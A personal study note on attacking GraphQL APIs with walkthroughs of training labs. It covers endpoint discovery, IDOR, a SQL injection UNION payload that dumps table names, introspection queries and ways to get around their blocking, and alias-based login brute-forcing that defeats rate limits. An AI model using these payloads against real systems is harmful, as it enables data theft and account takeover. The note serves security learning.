[[Bug]]

## Finding `GraphQL` endpoints

### Universal queries

send `query{__typename}` to any `GraphQL` endpoint, it will include the string `{"data": {"__typename": "query"}}` somewhere in its response

a way to know if it `graphql` or not

### Common endpoint names

- `/graphql`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`
add `v1` if any of these didn't catch it

>**NOTE**
>`GraphQL` services will often respond to any `non-GraphQL` request with a **"query not present"** or similar error.

### Request methods
Most `GraphQL` accepts `POST` method but trying `GET` or chaining content type that could have some vulnerability

If you can't find the `GraphQL` endpoint by sending POST requests to common endpoints, try resending the universal query using alternative HTTP methods.

### Tools to finding `GraphQL`

you can use tools such as:
1. [graphw00f](https://github.com/dolevf/graphw00f) it will search for the endpoint and see what the engine `graphQL` run  
## Exploiting uninitialized arguments
### Insecure Direct Object Reference (IDOR)

For example, the query below requests a product list for an online shop:

```
#Example product query
query { 
	products { 
		id 
		name 
		listed 
	} 
}
```

The product list returned contains only listed products.

```
#Example product response 
{ 
	"data": { 
		"products": [ 
			{ 
				"id": 1,
				 "name": "Product 1", 
				 "listed": true
			}, 
			{ 
				"id": 2, 
				"name": "Product 2", 
				"listed": true 
			}, 
			{ 
				"id": 4, 
				"name": "Product 4", 
				"listed": true 
			} 
		] 
	} 
}
```

From this information, we can infer the following:

- Products are assigned a sequential ID.
- Product ID 3 is missing from the list, possibly because it has been delisted.

```
#Query to get missing product 
	query { 
		product(id: 3) { 
			id 
			name
			listed
		} 
	}
```

this will let you get unlisted product

this could happen to `users` too by changing the name or the id to get access to information about another user 
### Injection Attacks

#### SQL Injection

`graphQL` could be vulnerable to SQL injection for example if there were query like this :

```
query {
  user(username: "admin") {
    id
    msg
  }
}
```
it will get the `id` and the `message` that related to  `admin`
if we change `"admin"` to `"admin'-- -"` it will get the same response ,

 if we made it like this `"admin'"`

the response:
```
{
  "errors": [
    {
      "message": "(pymysql.err.ProgrammingError) (1064, \"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''admin'' \\n LIMIT 1' at line 3\")\n[SQL: SELECT user.uuid AS user_uuid, user.id AS user_id, user.username AS user_username, user.password AS user_password, user.role AS user_role, user.msg AS user_msg \nFROM user \nWHERE username='admin'' \n LIMIT %(param_1)s]\n[parameters: {'param_1': 1}]\n(Background on this error at: https://sqlalche.me/e/20/f405)",
      "locations": [
        {
          "line": 2,
          "column": 3
        }
      ],
      "path": [
        "user"
      ]
    }
  ],
  "data": {
    "user": null
  }
}
```
here we knew that it have SQL injection 
from **introspection** we knew that `UserObject` have 6 columns  so we will use **`SQL UNION`** 
As the GraphQL query only returns the first row, we will use the [GROUP_CONCAT](https://mariadb.com/kb/en/group_concat/) function to exfiltrate multiple rows at a time. This enables us to exfiltrate all table names in the current database with the following payload:
```
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }  
}
```

## Discovering schema information(introspection)

using build-in `GraphQL` function to get information about schema like Introspection

### Using introspection

Introspection helps you to understand how you can interact with a `GraphQL` API. It can also disclose potentially sensitive data, such as description fields.

query the `__schema` field. This field is available on the root type of all queries.

you can let return only the available fields names

### Probing for introspection

they can enable introspection or disable it ,
 if it was enable :
```
#Introspection probe request 
{ 
	"query": "{__schema{queryType{name}}}" 
}
```

the response returns the names of all available queries.

### Running a full introspection query

The example query below returns full details on all queries, mutations, subscriptions, types, and fragments.

```
# Full Introspection Query
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      args {
        ...InputValue
      }
      # The following fields often need to be removed if the server rejects them:
      onOperation
      onFragment
      onField
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}

```

>  **Note**
> If introspection is enabled but the above query doesn't run, try removing the `onOperation`, `onFragment`, and `onField` directives from the query structure. Many endpoints do not accept these directives as part of an introspection query, and you can often have more success with introspection by removing them.

### Visualizing introspection results
You can view relationships between schema entities more easily using a [GraphQL visualizer](http://nathanrandal.com/graphql-visualizer/).
This is an online tool that takes the results of an introspection query and produces a visual representation of the returned data, including the relationships between operations and types.

for even better and local one , you can use this tool [graphql-voyager](https://github.com/APIs-guru/graphql-voyager) (the recommended one) and here the [online version of it](https://apis.guru/graphql-voyager/)

### if introspection was disabled
here there's some ways to get information even if it it disabled

Suggestions are a feature of the Apollo `GraphQL` platform in which the server can suggest query amendments in error messages. These are generally used where a query is slightly incorrect but still recognizable (for example, `There is no entry for 'productInfo'. Did you mean 'productInformation' instead?`).

[Clairvoyance](https://github.com/nikitastupin/clairvoyance) is a tool that uses suggestions to automatically recover all or part of a `GraphQL` schema, even when introspection is disabled.

### lab
after i'm in the website , i found this in the burp history `/graphql/v1` which mean this website have `graphql`, send it to the repeater and check if introspection is enabled or no

after i send the query , it was enable , after see the result **i found this `postpassword` .**

before anything i found this website **have 5 blog post but the one with `id =3` is not visible** 

after send `graphql/v1` to the repeater and change **the variable from `e.g. 5 to 3` and add `postpassword` to query panel** , here you will get  the post password

### lab
after i'm in the website , found this in the burp history `/graphql/v1` which mean this website have `graphql`, send it to the repeater and check if introspection is enabled or no

after i send the query , it was enable , `right click --> graphql --> save to site map`
after checking site map , you will find some query one of them `getUser` 

sending it to repeater and you will `id` if change it to `1` it will retrieve the username and the password of administrator 

sigh in , the lab is solved now

## Bypassing `GraphQL` introspection defenses

this defenses use to block using introspection , to bypassing it , try:

instead of `__schema{` write `__schema/n{` , try add space , keep changing until it work

if it do not work , try to change the **HTTP method** that used, e..g. change it from `POST` to `GET`,
also try to change the content type from  **`application/json`** to  **`application/www-form-urlencoded`** 

### lab (finding hidden `graphql` endpoint)

after get in the website you will not be  able to find `graphql` at all, so start searching
after some search , you will see that i**f send request to `/api`** will response with 
**`"Query not present`**

it could be the hidden `graphql` , **if send `POST` request to it** , it will no accept it so the only thing **we have is `GET` request** but to make sure this is really `graphql` endpoint , we will send this 
**`/api?query=query{__typename}`**
from the response 
```
{ 
	"data": { 
		"__typename": "query" 
	} 
}
```
we make sure this is hidden `graphql` endpoint , now let's try introspection with this 

```
/api?query=query+IntrospectionQuery+%7B%0A++__schema+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
```

it will response with `introspection is disable` change this part `__schema+%7B%0A` to this `__schema0A+%7B%0A` which it mean , changed from this `__schema{\n` to `__schema\n{\n`, that's lead to  bypass the defense

it will response with `introspection` respocse save it to site map , then from site map you will find this 
```
mutation($input: DeleteOrganizationUserInput) {
  deleteOrganizationUser(input: $input) {
    user {
      id
      username
    }
```
which will let you delete any user by only its id

## Bypassing rate limiting using aliases

some times websites put brute force defense but they put it on how many **HTTP  request you made not how many operation you do** .

 in this case you can perform more than one operation in one request ,
Ordinarily, GraphQL objects can't contain multiple properties with the same name. 

Aliases enable you to bypass this restriction by explicitly naming the properties you want the API to return.
**This operation could potentially bypass rate limiting as it is a single HTTP request** 

```
#Request with aliased queries

query isValidDiscount($code: Int) {

isvalidDiscount(code:$code){

valid

}

isValidDiscount2:isValidDiscount(code:$code){

valid

}

isValidDiscount3:isValidDiscount(code:$code){

valid

}

}
```
### lab bypassing rate limit to login

the login page is powered by `graphql` when try to login this what it show:
```
    mutation login($input: LoginInput!) {
        login(input: $input) {
            token
            success
        }
```

using alias to use more than on operation in one request , like this 
```

    mutation login($input: LoginInput!) {
        login(input: $input) {
            token
            success
        }
    
bruteforce0:login(input:{password: "hunter", username: "carlos"}) {
        token
        success
    }
```

not only one , use it as much as you can , the response will be like this:
```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Set-Cookie: session=QdI2CSqpRw0r5eKpVfOxJgBvueNOmzsO; Secure; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 10403

{
  "data": {
    "login": {
      "token": "k0LS6jqCdTFEWW5hL2y3ugtetqwktun8",
      "success": false
    },
    "bruteforce0": {
      "token": "k0LS6jqCdTFEWW5hL2y3ugtetqwktun8",
      "success": true
    },
```

now we know what the right username and the password , use it to login , the lab is solve 

